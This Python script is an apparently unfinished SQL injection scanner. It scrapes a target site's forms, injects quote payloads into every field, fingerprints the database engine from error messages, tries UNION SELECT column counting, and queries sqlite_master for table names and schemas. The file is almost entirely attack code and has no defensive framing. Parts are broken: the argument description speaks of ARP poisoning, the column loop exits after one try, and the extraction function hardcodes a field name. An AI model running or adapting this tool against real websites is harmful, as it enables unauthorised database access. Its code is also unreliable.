from bs4 import BeautifulSoup
from requests_html import HTMLSession
from urllib.parse import urljoin
from pprint import pprint
import argparse
import requests

parser = argparse.ArgumentParser(description="Perform ARP poisoning on a target")
parser.add_argument("url", help="The URL of the website to test for sqli")
parser.add_argument("-X", type=str, default="GET", metavar="METHOD", help="Enter the method")
# parser.add_argument("o", help="Enter the output of archive file")

args = parser.parse_args()
entrypoints = [ "'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))"]
session = HTMLSession()

tables = {
	"sqlite": "FROM sqlite_master"
}
infos = {
	"sqlite": ["name", "sql"] # sql for colums, name for tables
}

def make_request(payload, method):
	if method == "POST":
		return requests.post(args.url, data=payload)
	return requests.get(args.url + payload)



def get_all_forms(url):
	res = session.get(url)
	soup = BeautifulSoup(res.html.html, "html.parser")
	return soup.find_all("form")

def detect_engine(page):
	errors = {
		"mysql": ["You have an error in your SQL syntax", "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in"],
		"sqlite": ["SQLite3::query(): Unable to prepare statement"], 
		"postgresql": ["PostgreSQL query failed: ERROR: syntax error at or near"],
		"mssql": ["Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark after the character string"], 
		"oracle": ["Oracle Database Error"]
	}
	for engine, error_messages in errors.items():
		for error_message in error_messages:
			if page.find(error_message) != -1:
				return engine
	return "Unknown"

def detect_database_engine(form_details, method):
	working = []
	engine = "Unknown"
	for payload in entrypoints:
		# value = ["eXample4TeSt"]
		data = {}
		for input_tag in form_details["inputs"]:
			if input_tag["type"] != "submit":
				data[input_tag["name"]] = payload
		# data = {"login": "'", "password": "a"}
		res = make_request(data, method)
		html_response = res.text
		engine = detect_engine(html_response)
		if engine != "Unknown":
			working.append((engine, payload))
	return working



def detect_number_of_columns(form_details, working, method):
	data = {}
	columns = "NULL"
	nb_colums = 1
	while nb_colums > 0 and nb_colums < 20:
		for input_tag in form_details["inputs"]:
			if input_tag["type"] != "submit":
				data[input_tag["name"]] = f"{working} UNION SELECT {columns} --"
		res = make_request(data, method)
		html_response = res.text
		#if # analyze the response report incorrect number of columns
		nb_colums += 1
		columns += ",NULL"
		return columns
	return "Unknown"


def get_infos(infos, entrypoint, nb_params, field, engine):
	for i in range(1, nb_params):
		infos += ", NULL"
	injection = f"{entrypoint} UNION SELECT {infos} {tables[engine]}"
	data={field: injection, "password": "aa"}
	# if (args.x == "POST"):
	res = requests.post(args.url, data=data)
	# else:
		# requests.get(args.url + injection)
	html_response = res.text
	print(html_response)
	# need to parse response to find infos needed



def get_form_details(form):
	details = {}
	action = form.attrs.get("action").lower()
	method = form.attrs.get("method", "get").lower()
	inputs = []
	for input_tag in form.find_all("input"):
		input_type = input_tag.attrs.get("type", "text")
		input_name = input_tag.attrs.get("name")
		input_value =input_tag.attrs.get("value", "")
		inputs.append({"type": input_type, "name": input_name, "value": input_value})
	for select in form.find_all("select"):
		select_name = select.attrs.get("name")
		select_type = "select"
		select_options = []
		select_default_value = ""
		for select_option in select.find_all("option"):
			option_value = select_option.attrs.get("value")
			if option_value:
				select_options.append(option_value)
				if select_option.attrs.get("selected"):
					select_default_value = option_value
		if not select_default_value and select_options:
			select_default_value = select_options[0]
		inputs.append({"type": select_type, "name": select_name, "values": select_options, "value": select_default_value})
	for textarea in form.find_all("textarea"):
		textarea_name = textarea.attrs.get("name")
		textarea_type = "textarea"
		textarea_value = textarea.attrs.get("value", "")
		inputs.append({"type": textarea_type, "name": textarea_name, "value": textarea_value})
	details["action"] = action
	details["method"] = method
	details["inputs"] = inputs
	return details

if __name__ == "__main__":
	page = session.get(args.url)
	forms = get_all_forms(args.url)
	for form in forms:
		form_details = get_form_details(form)
		engine = detect_database_engine(form_details, "POST")
		print(engine)
		# get_infos("name", "'", 2, "login", entry[0][0])